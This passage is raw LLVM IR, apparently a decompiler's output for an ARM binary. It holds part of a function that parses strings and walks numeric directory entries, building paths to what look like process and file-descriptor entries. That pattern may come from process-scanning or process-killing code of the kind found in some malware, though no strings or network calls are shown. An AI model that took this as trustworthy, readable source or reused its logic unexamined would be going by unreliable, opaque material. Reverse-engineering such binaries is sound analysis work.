  %v0_cac018 = phi i32 [ %v1_cac0, %bb130 ], [ %v2_caa8, %dec_label_pc_caa8 ]
  %v1_cab0 = add i32 %v0_cac018, 3
  %v2_cab0 = inttoptr i32 %v1_cab0 to i8*
  %v3_cab0 = load i8, i8* %v2_cab0, align 1
  %v2_cab4 = icmp eq i8 %v3_cab0, 0
  br i1 %v2_cab4, label %.thread15, label %bb130

.thread15:                                        ; preds = %dec_label_pc_cab0
  %v1_cabc17 = add i32 %v0_cabc16, 1
  store i32 %v1_cabc17, i32* @r5, align 4
  br label %dec_label_pc_cac8

bb130:                                            ; preds = %dec_label_pc_cab0
  %v8_cab8 = icmp eq i8 %v3_cab0, 32
  %v1_cabc = add i32 %v0_cabc16, 1
  store i32 %v1_cabc, i32* @r5, align 4
  %v1_cac0 = add i32 %v0_cac018, 1
  br i1 %v8_cab8, label %dec_label_pc_cac8, label %dec_label_pc_cab0

dec_label_pc_cac8:                                ; preds = %bb130, %bb129, %.thread15, %.thread13
  %v1_cad4 = phi i32 [ %v1_cabc17, %.thread15 ], [ %v1_ca88, %.thread13 ], [ %v1_ca88, %bb129 ], [ %v1_cabc, %bb130 ]
  %v0_cac8 = load i32, i32* @r6, align 4
  %v2_cac8 = add i32 %v0_cac8, %v1_ca88
  store i32 %v2_cac8, i32* @r4, align 4
  %v2_cad4 = add i32 %v1_cad4, %v2_ca8c
  store i32 0, i32* @r7, align 4
  %v3_cadc = add i32 %v2_cad4, -545
  %v4_cadc = inttoptr i32 %v3_cadc to i8*
  store i8 0, i8* %v4_cadc, align 1
  %v0_cae0 = load i32, i32* @r4, align 4
  %v1_cae4 = inttoptr i32 %v0_cae0 to i8*
  %v2_cae4 = call i32 @function_10120(i8* %v1_cae4)
  store i32 %v2_cae4, i32* @r1, align 4
  %v0_caf0 = load i32, i32* @r4, align 4
  %v3_caf4 = inttoptr i32 %v0_caf0 to i8*
  %v4_caf4 = call i32 @function_10470(i8* %v3_caf4, i32 %v2_cae4, i32 %v2_c9bc)
  %v7_caf8 = icmp eq i32 %v4_caf4, -1
  br i1 %v7_caf8, label %dec_label_pc_ca2c.backedge, label %dec_label_pc_cb14.preheader

dec_label_pc_cb14.preheader:                      ; preds = %dec_label_pc_cac8
  %v1_cafc = load i32, i32* @r7, align 4
  %v1_cb00 = load i32, i32* @r6, align 4
  %v2_cb00 = load i32, i32* @r5, align 4
  %v3_cb00 = add i32 %v2_cb00, %v1_cb00
  store i32 %v1_cafc, i32* @lr, align 4
  %v1_cb1448 = add i32 %v3_cb00, 2
  %v2_cb1449 = inttoptr i32 %v1_cb1448 to i8*
  %v3_cb1450 = load i8, i8* %v2_cb1449, align 1
  %v2_cb1852 = icmp eq i8 %v3_cb1450, 0
  %v1_cb1c54 = add i32 %v2_cb00, 2
  br i1 %v2_cb1852, label %dec_label_pc_cb4c, label %dec_label_pc_cb24

dec_label_pc_cb24:                                ; preds = %dec_label_pc_cb14.preheader, %dec_label_pc_cb14.backedge
  %v0_cb4c83 = phi i32 [ %v0_cb4c81, %dec_label_pc_cb14.backedge ], [ %v1_cafc, %dec_label_pc_cb14.preheader ]
  %v0_cb34.pr = phi i32 [ %v0_cb34.pr70, %dec_label_pc_cb14.backedge ], [ %v1_cafc, %dec_label_pc_cb14.preheader ]
  %v0_ce54 = phi i32 [ %v0_ce5473, %dec_label_pc_cb14.backedge ], [ %v1_cafc, %dec_label_pc_cb14.preheader ]
  %v0_cb1c78 = phi i32 [ %v1_cb1c, %dec_label_pc_cb14.backedge ], [ %v1_cb1c54, %dec_label_pc_cb14.preheader ]
  %v0_cb44 = phi i32 [ %v0_cb14, %dec_label_pc_cb14.backedge ], [ %v3_cb00, %dec_label_pc_cb14.preheader ]
  %v1_cb28.in = phi i8 [ %v3_cb14, %dec_label_pc_cb14.backedge ], [ %v3_cb1450, %dec_label_pc_cb14.preheader ]
  %v7_cb24 = icmp eq i8 %v1_cb28.in, 9
  br i1 %v7_cb24, label %bb132, label %bb131

bb131:                                            ; preds = %dec_label_pc_cb24
  %v8_cb28 = icmp eq i8 %v1_cb28.in, 32
  br i1 %v8_cb28, label %.thread27, label %dec_label_pc_cb34

.thread27:                                        ; preds = %bb131
  br label %dec_label_pc_cb40

bb132:                                            ; preds = %dec_label_pc_cb24
  br label %dec_label_pc_cb40

dec_label_pc_cb34:                                ; preds = %bb131
  %v7_cb34 = icmp eq i32 %v0_cb34.pr, 1
  br i1 %v7_cb34, label %dec_label_pc_ce54, label %dec_label_pc_cb3c

dec_label_pc_cb3c:                                ; preds = %dec_label_pc_ce54, %dec_label_pc_cb34
  %v0_cb4075 = phi i32 [ %v1_ce54, %dec_label_pc_ce54 ], [ %v0_ce54, %dec_label_pc_cb34 ]
  br label %dec_label_pc_cb40

dec_label_pc_cb40:                                ; preds = %bb132, %.thread27, %dec_label_pc_cb3c
  %v0_cb40 = phi i32 [ %v0_ce54, %.thread27 ], [ %v0_ce54, %bb132 ], [ %v0_cb4075, %dec_label_pc_cb3c ]
  %v0_cb34.pr71 = phi i32 [ 1, %.thread27 ], [ 1, %bb132 ], [ 0, %dec_label_pc_cb3c ]
  %v7_cb48 = icmp sgt i32 %v0_cb40, 6
  br i1 %v7_cb48, label %dec_label_pc_cb4c, label %dec_label_pc_cb14.backedge

dec_label_pc_cb4c:                                ; preds = %dec_label_pc_cb14.backedge, %dec_label_pc_cb40, %dec_label_pc_cb14.preheader
  %v1_cb9c = phi i32 [ %v1_cb1c54, %dec_label_pc_cb14.preheader ], [ %v1_cb1c, %dec_label_pc_cb14.backedge ], [ %v0_cb1c78, %dec_label_pc_cb40 ]
  %v0_cb4c = phi i32 [ %v1_cafc, %dec_label_pc_cb14.preheader ], [ %v0_cb4c81, %dec_label_pc_cb14.backedge ], [ %v0_cb4c83, %dec_label_pc_cb40 ]
  %v2_cb4c = icmp eq i32 %v0_cb4c, 0
  br i1 %v2_cb4c, label %dec_label_pc_ca2c.backedge, label %dec_label_pc_cb58

dec_label_pc_cb58:                                ; preds = %dec_label_pc_cb4c
  %v2_cb60 = add i32 %v1_cb9c, %v2_ca8c
  %v1_cb64 = add i32 %v2_cb60, -545
  %v2_cb64 = inttoptr i32 %v1_cb64 to i8*
  %v3_cb64 = load i8, i8* %v2_cb64, align 1
  %v2_cb68 = icmp eq i8 %v3_cb64, 0
  br i1 %v2_cb68, label %dec_label_pc_cb98, label %bb133

bb133:                                            ; preds = %dec_label_pc_cb58
  %v8_cb6c = icmp eq i8 %v3_cb64, 32
  br i1 %v8_cb6c, label %dec_label_pc_cb98, label %dec_label_pc_cb74

dec_label_pc_cb74:                                ; preds = %bb133
  %v2_cb74 = add i32 %v1_cb9c, %v1_cb00
  br label %dec_label_pc_cb78

dec_label_pc_cb78:                                ; preds = %bb134, %dec_label_pc_cb74
  %v0_cb8430 = phi i32 [ %v1_cb84, %bb134 ], [ %v1_cb9c, %dec_label_pc_cb74 ]
  %v0_cb78 = phi i32 [ %v1_cb78, %bb134 ], [ %v2_cb74, %dec_label_pc_cb74 ]
  %v1_cb78 = add i32 %v0_cb78, 1
  %v2_cb78 = inttoptr i32 %v1_cb78 to i8*
  %v3_cb78 = load i8, i8* %v2_cb78, align 1
  %v2_cb7c = icmp eq i8 %v3_cb78, 0
  br i1 %v2_cb7c, label %.thread29, label %bb134

.thread29:                                        ; preds = %dec_label_pc_cb78
  %v1_cb8431 = add i32 %v0_cb8430, 1
  br label %dec_label_pc_cb8c

bb134:                                            ; preds = %dec_label_pc_cb78
  %v8_cb80 = icmp eq i8 %v3_cb78, 32
  %v1_cb84 = add i32 %v0_cb8430, 1
  br i1 %v8_cb80, label %dec_label_pc_cb8c, label %dec_label_pc_cb78

dec_label_pc_cb8c:                                ; preds = %bb134, %.thread29
  %v1_cb94 = phi i32 [ %v1_cb8431, %.thread29 ], [ %v1_cb84, %bb134 ]
  %v2_cb94 = add i32 %v1_cb94, %v2_ca8c
  br label %dec_label_pc_cb98

dec_label_pc_cb98:                                ; preds = %dec_label_pc_cb58, %bb133, %dec_label_pc_cb8c
  %v2_cba4 = phi i32 [ %v2_cb60, %dec_label_pc_cb58 ], [ %v2_cb60, %bb133 ], [ %v2_cb94, %dec_label_pc_cb8c ]
  %v2_cb9c = add i32 %v1_cb9c, %v1_cb00
  store i32 %v2_cb9c, i32* @r4, align 4
  %v3_cba4 = add i32 %v2_cba4, -545
  %v4_cba4 = inttoptr i32 %v3_cba4 to i8*
  store i8 0, i8* %v4_cba4, align 1
  %v1_cba8 = inttoptr i32 %v2_cb9c to i8*
  %v2_cba8 = call i32 @function_10120(i8* %v1_cba8)
  %v8_cbb0 = icmp sgt i32 %v2_cba8, 15
  br i1 %v8_cbb0, label %dec_label_pc_ca2c.backedge, label %dec_label_pc_cbb4

dec_label_pc_cbb4:                                ; preds = %dec_label_pc_cb98
  %v0_cbb8 = load i32, i32* @r4, align 4
  %v2_cbbc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_cbbc, i32* @r0, align 4
  %v2_cbc0 = bitcast i32* %stack_var_-56 to i8*
  %v3_cbc0 = call i32 @function_10148(i8* %v2_cbc0, i32 %v0_cbb8)
  br label %dec_label_pc_cbc4

dec_label_pc_cbc4.loopexit:                       ; preds = %dec_label_pc_ca2c.backedge, %dec_label_pc_ca2c.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre92 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_cbc4

dec_label_pc_cbc4:                                ; preds = %dec_label_pc_cbc4.loopexit, %dec_label_pc_cbb4
  %v1_cbd4.pre-phi = phi i8* [ %.pre92, %dec_label_pc_cbc4.loopexit ], [ %v2_cbc0, %dec_label_pc_cbb4 ]
  %v2_cbd0.pre-phi = phi i32 [ %.pre, %dec_label_pc_cbc4.loopexit ], [ %v2_cbbc, %dec_label_pc_cbb4 ]
  %v0_cbc4 = load i32, i32* @r8, align 4
  %v1_cbc8 = call i32 @function_10be0(i32 %v0_cbc4)
  %v2_cbd4 = call i32 @function_10120(i8* %v1_cbd4.pre-phi)
  store i32 %v2_cbd4, i32* @r4, align 4
  %v2_cbd8 = icmp eq i32 %v2_cbd4, 0
  br i1 %v2_cbd8, label %dec_label_pc_ce80, label %dec_label_pc_cbe0

dec_label_pc_cbe0:                                ; preds = %dec_label_pc_cbc4
  %v3_cbe8 = call i32 @function_fc7c(i32 13, i32* null)
  %v1_cbec = call i32 @function_10ddc(i32 %v3_cbe8)
  store i32 %v1_cbec, i32* @sb, align 4
  %v2_cbf0 = icmp eq i32 %v1_cbec, 0
  br i1 %v2_cbf0, label %dec_label_pc_ce20, label %dec_label_pc_cc00.preheader

dec_label_pc_cc00.preheader:                      ; preds = %dec_label_pc_cbe0
  store i32 0, i32* @r5, align 4
  %v1_cc0443 = inttoptr i32 %v1_cbec to i32*
  %v2_cc0444 = call i32 @function_10f20(i32* %v1_cc0443)
  %v2_cc0846 = icmp eq i32 %v2_cc0444, 0
  br i1 %v2_cc0846, label %dec_label_pc_ce14, label %dec_label_pc_cc10.preheader

dec_label_pc_cc00.loopexit:                       ; preds = %dec_label_pc_cc18, %dec_label_pc_cc28, %dec_label_pc_cc94
  %v0_cc00 = load i32, i32* @sb, align 4
  %v1_cc04 = inttoptr i32 %v0_cc00 to i32*
  %v2_cc04 = call i32 @function_10f20(i32* %v1_cc04)
  %v2_cc08 = icmp eq i32 %v2_cc04, 0
  br i1 %v2_cc08, label %dec_label_pc_ce14, label %dec_label_pc_cc10.preheader

dec_label_pc_cc10.preheader:                      ; preds = %dec_label_pc_cc00.preheader, %dec_label_pc_cc00.loopexit
  %v0_cc1891 = phi i32 [ %v2_cc04, %dec_label_pc_cc00.loopexit ], [ %v2_cc0444, %dec_label_pc_cc00.preheader ]
  br label %dec_label_pc_cc10

dec_label_pc_cc10:                                ; preds = %dec_label_pc_cc10.preheader, %dec_label_pc_cdfc
  %v0_cc30 = phi i32 [ %v0_cc1891, %dec_label_pc_cc10.preheader ], [ %v2_ce08, %dec_label_pc_cdfc ]
  %v0_cc10 = load i32, i32* @r5, align 4
  %v2_cc10 = icmp eq i32 %v0_cc10, 0
  br i1 %v2_cc10, label %dec_label_pc_cc18, label %dec_label_pc_ce14

dec_label_pc_cc18:                                ; preds = %dec_label_pc_cc10
  %v1_cc18 = add i32 %v0_cc30, 11
  %v2_cc18 = inttoptr i32 %v1_cc18 to i8*
  %v3_cc18 = load i8, i8* %v2_cc18, align 1
  %v4_cc18 = zext i8 %v3_cc18 to i32
  %v1_cc1c = add nsw i32 %v4_cc18, -48
  %tmp = icmp ugt i32 %v1_cc1c, 9
  br i1 %tmp, label %dec_label_pc_cc00.loopexit, label %dec_label_pc_cc28

dec_label_pc_cc28:                                ; preds = %dec_label_pc_cc18
  store i32 %v1_cc18, i32* @r7, align 4
  %v3_cc34 = call i32 @function_fc7c(i32 13, i32* null)
  store i32 %v2_c994, i32* @r0, align 4
  %v3_cc40 = call i32 @function_10148(i8* %v2_c9b8, i32 %v3_cc34)
  %v2_cc48 = call i32 @function_10120(i8* %v2_c9b8)
  %v0_cc4c = load i32, i32* @r7, align 4
  %v1_cc50 = load i32, i32* @sl, align 4
  %v2_cc50 = add i32 %v1_cc50, %v2_cc48
  store i32 %v2_cc50, i32* @r0, align 4
  %v2_cc54 = inttoptr i32 %v2_cc50 to i8*
  %v3_cc54 = call i32 @function_10148(i8* %v2_cc54, i32 %v0_cc4c)
  %v2_cc5c = call i32 @function_10120(i8* %v2_c9b8)
  %v0_cc60 = load i32, i32* @r5, align 4
  store i32 %v2_cc5c, i32* @r4, align 4
  %v2_cc6c = inttoptr i32 %v0_cc60 to i32*
  %v3_cc6c = call i32 @function_fc7c(i32 14, i32* %v2_cc6c)
  %v0_cc74 = load i32, i32* @r4, align 4
  %v1_cc74 = load i32, i32* @sl, align 4
  %v2_cc74 = add i32 %v1_cc74, %v0_cc74
  store i32 %v2_cc74, i32* @r0, align 4
  %v2_cc78 = inttoptr i32 %v2_cc74 to i8*
  %v3_cc78 = call i32 @function_10148(i8* %v2_cc78, i32 %v3_cc6c)
  %v3_cc88 = call i32 @function_10944(i32 %v2_c994, i32 %v2_c984, i32 4096)
  %v7_cc8c = icmp eq i32 %v3_cc88, -1
  br i1 %v7_cc8c, label %dec_label_pc_cc00.loopexit, label %dec_label_pc_cc94

dec_label_pc_cc94:                                ; preds = %dec_label_pc_cc28
  %v0_cc94 = load i32, i32* @r5, align 4
  %v2_cc9c = inttoptr i32 %v0_cc94 to i32*
  %v3_cc9c = call i32 @function_fc7c(i32 13, i32* %v2_cc9c)
  store i32 %v2_c994, i32* @r0, align 4
  %v3_cca8 = call i32 @function_10148(i8* %v2_c9b8, i32 %v3_cc9c)
  %v2_ccb0 = call i32 @function_10120(i8* %v2_c9b8)
  %v0_ccb4 = load i32, i32* @r7, align 4
  %v1_ccb8 = load i32, i32* @sl, align 4
  %v2_ccb8 = add i32 %v1_ccb8, %v2_ccb0
  store i32 %v2_ccb8, i32* @r0, align 4
  %v2_ccbc = inttoptr i32 %v2_ccb8 to i8*
  %v3_ccbc = call i32 @function_10148(i8* %v2_ccbc, i32 %v0_ccb4)
  %v2_ccc4 = call i32 @function_10120(i8* %v2_c9b8)
  %v0_ccc8 = load i32, i32* @r5, align 4
  store i32 %v2_ccc4, i32* @r4, align 4
  %v2_ccd4 = inttoptr i32 %v0_ccc8 to i32*
  %v3_ccd4 = call i32 @function_fc7c(i32 15, i32* %v2_ccd4)
  %v0_ccdc = load i32, i32* @r4, align 4
  %v1_ccdc = load i32, i32* @sl, align 4
  %v2_ccdc = add i32 %v1_ccdc, %v0_ccdc
  store i32 %v2_ccdc, i32* @r0, align 4
  %v2_cce0 = inttoptr i32 %v2_ccdc to i8*
  %v3_cce0 = call i32 @function_10148(i8* %v2_cce0, i32 %v3_ccd4)
  %v1_cce8 = call i32 @function_10ddc(i32 %v2_c994)
  store i32 %v1_cce8, i32* @r8, align 4
  %v2_ccec = icmp eq i32 %v1_cce8, 0
  br i1 %v2_ccec, label %dec_label_pc_cc00.loopexit, label %dec_label_pc_ccf4.preheader

dec_label_pc_ccf4.preheader:                      ; preds = %dec_label_pc_cc94
  %v1_ccf838 = inttoptr i32 %v1_cce8 to i32*
  %v2_ccf839 = call i32 @function_10f20(i32* %v1_ccf838)
  store i32 %v2_ccf839, i32* @r6, align 4
  %v2_ccfc41 = icmp eq i32 %v2_ccf839, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c984, i32* @r0, align 4
  br i1 %v2_ccfc41, label %dec_label_pc_cdfc, label %dec_label_pc_cd0cthread-pre-split

dec_label_pc_ccf4.loopexit:                       ; preds = %dec_label_pc_cd14, %dec_label_pc_cdac
  %v0_ccf4 = load i32, i32* @r8, align 4
  %v1_ccf8 = inttoptr i32 %v0_ccf4 to i32*
  %v2_ccf8 = call i32 @function_10f20(i32* %v1_ccf8)
  store i32 %v2_ccf8, i32* @r6, align 4
  %v2_ccfc = icmp eq i32 %v2_ccf8, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c984, i32* @r0, align 4
  br i1 %v2_ccfc, label %dec_label_pc_cdfc, label %dec_label_pc_cd0cthread-pre-split

dec_label_pc_cd0cthread-pre-split:                ; preds = %dec_label_pc_ccf4.preheader, %dec_label_pc_ccf4.loopexit
  %v0_cd0c.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_cd0c

dec_label_pc_cd0c:                                ; preds = %dec_label_pc_cd0cthread-pre-split, %dec_label_pc_cdd4
  %v0_cd0c = phi i32 [ %v0_cd0c.pr, %dec_label_pc_cd0cthread-pre-split ], [ 1, %dec_label_pc_cdd4 ]
  %v2_cd0c = icmp eq i32 %v0_cd0c, 0
  br i1 %v2_cd0c, label %dec_label_pc_cd14, label %dec_label_pc_cdfc

dec_label_pc_cd14:                                ; preds = %dec_label_pc_cd0c
  %v0_cd14 = call i32 @function_101b4()
  %v0_cd18 = load i32, i32* @r5, align 4
  %v2_cd20 = inttoptr i32 %v0_cd18 to i32*
  %v3_cd20 = call i32 @function_fc7c(i32 13, i32* %v2_cd20)
  store i32 %v2_c994, i32* @r0, align 4
  %v3_cd2c = call i32 @function_10148(i8* %v2_c9b8, i32 %v3_cd20)
  %v2_cd34 = call i32 @function_10120(i8* %v2_c9b8)
  %v0_cd38 = load i32, i32* @r7, align 4
  %v1_cd3c = load i32, i32* @sl, align 4
  %v2_cd3c = add i32 %v1_cd3c, %v2_cd34
  store i32 %v2_cd3c, i32* @r0, align 4
  %v2_cd40 = inttoptr i32 %v2_cd3c to i8*
  %v3_cd40 = call i32 @function_10148(i8* %v2_cd40, i32 %v0_cd38)
  %v2_cd48 = call i32 @function_10120(i8* %v2_c9b8)
  %v0_cd4c = load i32, i32* @r5, align 4
  store i32 %v2_cd48, i32* @r4, align 4
  %v2_cd58 = inttoptr i32 %v0_cd4c to i32*
  %v3_cd58 = call i32 @function_fc7c(i32 15, i32* %v2_cd58)
  %v0_cd60 = load i32, i32* @r4, align 4
  %v1_cd60 = load i32, i32* @sl, align 4
  %v2_cd60 = add i32 %v1_cd60, %v0_cd60
  store i32 %v2_cd60, i32* @r0, align 4
  %v2_cd64 = inttoptr i32 %v2_cd60 to i8*
  %v3_cd64 = call i32 @function_10148(i8* %v2_cd64, i32 %v3_cd58)
  %v2_cd6c = call i32 @function_10120(i8* %v2_c9b8)
  %v1_cd74 = load i32, i32* @sl, align 4
  %v2_cd74 = add i32 %v1_cd74, %v2_cd6c
  store i32 %v2_cd74, i32* @r0, align 4
  %v2_cd78 = inttoptr i32 %v2_cd74 to i8*
  %v3_cd78 = call i32 @function_10148(i8* %v2_cd78, i32 ptrtoint (i32* @global_var_15f4c.57 to i32))
  %v2_cd80 = call i32 @function_10120(i8* %v2_c9b8)
  %v0_cd84 = load i32, i32* @r6, align 4
  %v1_cd84 = add i32 %v0_cd84, 11
  %v1_cd88 = load i32, i32* @sl, align 4
  %v2_cd88 = add i32 %v1_cd88, %v2_cd80
  store i32 %v2_cd88, i32* @r0, align 4
  %v2_cd8c = inttoptr i32 %v2_cd88 to i8*
  %v3_cd8c = call i32 @function_10148(i8* %v2_cd8c, i32 %v1_cd84)
  %v3_cd9c = call i32 @function_10944(i32 %v2_c994, i32 %v2_c984, i32 4096)
  %v7_cda0 = icmp eq i32 %v3_cd9c, -1
  br i1 %v7_cda0, label %dec_label_pc_ccf4.loopexit, label %dec_label_pc_cdac

dec_label_pc_cdac:                                ; preds = %dec_label_pc_cd14
  %v2_cdac = call i32 @function_10120(i8* %v2_c9a4)
  store i32 %v2_cdac, i32* @r1, align 4
  %v4_cdc0 = call i32 @function_10470(i8* %v2_c9a4, i32 %v2_cdac, i32 %v2_cbd0.pre-phi)
  %v7_cdc4 = icmp eq i32 %v4_cdc0, -1
  br i1 %v7_cdc4, label %dec_label_pc_ccf4.loopexit, label %dec_label_pc_cdd4

dec_label_pc_cdd4:                                ; preds = %dec_label_pc_cdac
  %v0_cdcc = load i32, i32* @r7, align 4
  %v2_cdd4 = inttoptr i32 %v0_cdcc to i8*
  %v3_cdd4 = call i32 @function_10244(i8* %v2_cdd4, i32 10)
  %v2_cddc = call i32 @function_109ac(i32 %v3_cdd4, i32 9)
  %v0_cde0 = load i32, i32* @r8, align 4
  %v1_cde4 = inttoptr i32 %v0_cde0 to i32*
  %v2_cde4 = call i32 @function_10f20(i32* %v1_cde4)
  store i32 %v2_cde4, i32* @r6, align 4
  %v2_cde8 = icmp eq i32 %v2_cde4, 0
  store i32 1, i32* @r5, align 4
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c984, i32* @r0, align 4
  br i1 %v2_cde8, label %dec_label_pc_cdfc, label %dec_label_pc_cd0c

dec_label_pc_cdfc:                                ; preds = %dec_label_pc_ccf4.loopexit, %dec_label_pc_cdd4, %dec_label_pc_cd0c, %dec_label_pc_ccf4.preheader
  %v0_cdfc = load i32, i32* @r8, align 4
  %v1_ce00 = inttoptr i32 %v0_cdfc to i32*
  %v2_ce00 = call i32 @function_10c14(i32* %v1_ce00)
  %v0_ce04 = load i32, i32* @sb, align 4
  %v1_ce08 = inttoptr i32 %v0_ce04 to i32*
  %v2_ce08 = call i32 @function_10f20(i32* %v1_ce08)
  %v2_ce0c = icmp eq i32 %v2_ce08, 0
  br i1 %v2_ce0c, label %dec_label_pc_ce14, label %dec_label_pc_cc10

dec_label_pc_ce14:                                ; preds = %dec_label_pc_cc00.loopexit, %dec_label_pc_cdfc, %dec_label_pc_cc10, %dec_label_pc_cc00.preheader
  %v0_ce14 = load i32, i32* @sb, align 4
  %v1_ce18 = inttoptr i32 %v0_ce14 to i32*
  %v2_ce18 = call i32 @function_10c14(i32* %v1_ce18)
  %v0_ce1c = load i32, i32* @r5, align 4
  %v1_ce1c = urem i32 %v0_ce1c, 256
  br label %dec_label_pc_ce20

dec_label_pc_ce20:                                ; preds = %dec_label_pc_cbe0, %dec_label_pc_ce14
  %storemerge = phi i32 [ %v1_ce1c, %dec_label_pc_ce14 ], [ 0, %dec_label_pc_cbe0 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_ce24 = call i32 @function_12cc8(i32 1)
  %v1_ce2c = call i32 @function_fca0(i32 13)
  %v1_ce34 = call i32 @function_fca0(i32 14)
  %v1_ce3c = call i32 @function_fca0(i32 15)
  br label %dec_label_pc_ce40

dec_label_pc_ce40:                                ; preds = %bb, %dec_label_pc_ce80, %dec_label_pc_ce20
  %v0_ce40 = load i32, i32* @r4, align 4
  store i32 %v3_c93c, i32* @r4, align 4
  store i32 %v6_c93c, i32* @r5, align 4
  store i32 %v9_c93c, i32* @r6, align 4
  store i32 %v12_c93c, i32* @r7, align 4
  store i32 %v15_c93c, i32* @r8, align 4
  store i32 %v18_c93c, i32* @sb, align 4
  store i32 %v21_c93c, i32* @sl, align 4
  store i32 %v24_c93c, i32* @fp, align 4
  store i32 %v27_c93c, i32* @lr, align 4
  ret i32 %v0_ce40

dec_label_pc_ce54:                                ; preds = %dec_label_pc_cb34
  %v1_ce54 = add i32 %v0_ce54, 1
  %v7_ce58 = icmp eq i32 %v0_ce54, 0
  br i1 %v7_ce58, label %dec_label_pc_ce60, label %dec_label_pc_cb3c

dec_label_pc_ce60:                                ; preds = %dec_label_pc_ce54
  %v1_ce60 = add i32 %v0_cb44, 3
  %v2_ce60 = inttoptr i32 %v1_ce60 to i8*
  %v3_ce60 = load i8, i8* %v2_ce60, align 1
  %v7_ce64 = icmp eq i8 %v3_ce60, 65
  br i1 %v7_ce64, label %dec_label_pc_ce78, label %dec_label_pc_ce6c

dec_label_pc_ce6c:                                ; preds = %dec_label_pc_ce60, %dec_label_pc_ce78
  %v0_cb4c82 = phi i32 [ %v0_cb4c83, %dec_label_pc_ce60 ], [ 1, %dec_label_pc_ce78 ]
  br label %dec_label_pc_cb14.backedge

dec_label_pc_cb14.backedge:                       ; preds = %dec_label_pc_ce6c, %dec_label_pc_cb40
  %v0_cb4c81 = phi i32 [ %v0_cb4c82, %dec_label_pc_ce6c ], [ %v0_cb4c83, %dec_label_pc_cb40 ]
  %v0_ce5473 = phi i32 [ %v1_ce54, %dec_label_pc_ce6c ], [ %v0_cb40, %dec_label_pc_cb40 ]
  %v0_cb34.pr70 = phi i32 [ 0, %dec_label_pc_ce6c ], [ %v0_cb34.pr71, %dec_label_pc_cb40 ]
  %v0_cb14 = add i32 %v0_cb44, 1
  %v1_cb14 = add i32 %v0_cb44, 3
  %v2_cb14 = inttoptr i32 %v1_cb14 to i8*
  %v3_cb14 = load i8, i8* %v2_cb14, align 1
  %v2_cb18 = icmp eq i8 %v3_cb14, 0
  %v1_cb1c = add i32 %v0_cb1c78, 1
  br i1 %v2_cb18, label %dec_label_pc_cb4c, label %dec_label_pc_cb24

dec_label_pc_ce78:                                ; preds = %dec_label_pc_ce60
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_ce6c

dec_label_pc_ce80:                                ; preds = %dec_label_pc_cbc4
  %v1_ce84 = call i32 @function_fca0(i32 13)
  %v1_ce8c = call i32 @function_fca0(i32 14)
  %v1_ce94 = call i32 @function_fca0(i32 15)
  %v1_ce9c = call i32 @function_fca0(i32 17)
  br label %dec_label_pc_ce40

dec_label_pc_cea4:                                ; preds = %dec_label_pc_c93c
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_c9e8

; uselistorder directives
  uselistorder i32 %v1_cb1c, { 1, 0 }
  uselistorder i8 %v3_cb14, { 1, 0 }
  uselistorder i32 %v0_cb4c81, { 1, 0 }
  uselistorder i32 %v1_ce54, { 1, 0 }
  uselistorder i32 %v2_ce08, { 1, 0 }
  uselistorder i32 %v1_cb78, { 1, 0 }
  uselistorder i32 %v0_cb8430, { 1, 0 }
  uselistorder i32 %v1_cb9c, { 0, 3, 1, 2 }
  uselistorder i32 %v0_cb40, { 1, 0 }
  uselistorder i32 %v0_cb1c78, { 1, 0 }
  uselistorder i32 %v0_ce54, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_cb4c83, { 1, 2, 0 }
  uselistorder i32 %v1_cb1c54, { 1, 0 }
  uselistorder i32 %v2_cb00, { 1, 0 }
  uselistorder i32 %v1_cafc, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_cabc, { 0, 2, 1 }
  uselistorder i32 %v0_cabc16, { 1, 0 }
  uselistorder i32 %v1_ca88, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v2_ca18, { 1, 2, 0 }
  uselistorder i32 %v0_c9c0, { 1, 0 }
  uselistorder i32 %v2_c9bc, { 1, 0, 2 }
  uselistorder i8* %v2_c9a4, { 1, 0, 2 }
  uselistorder i32 %v2_c984, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32, i32)* @function_10380, { 1, 0 }
  uselistorder label %dec_label_pc_ce6c, { 1, 0 }
  uselistorder label %dec_label_pc_ce40, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ce20, { 1, 0 }
  uselistorder label %dec_label_pc_ce14, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_cdfc, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_cd0c, { 1, 0 }
  uselistorder label %dec_label_pc_cd0cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_ccf4.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_cc10, { 1, 0 }
  uselistorder label %dec_label_pc_cc10.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_cc00.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cb98, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cb40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cb24, { 1, 0 }
  uselistorder label %dec_label_pc_cac8, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_ca2c.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_ca7c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_ca44, { 1, 0 }
  uselistorder label %dec_label_pc_c9e8, { 1, 0 }
}

define i32 @function_ced0(i32 %arg1) local_unnamed_addr {
dec_label_pc_ced0:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-8480 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
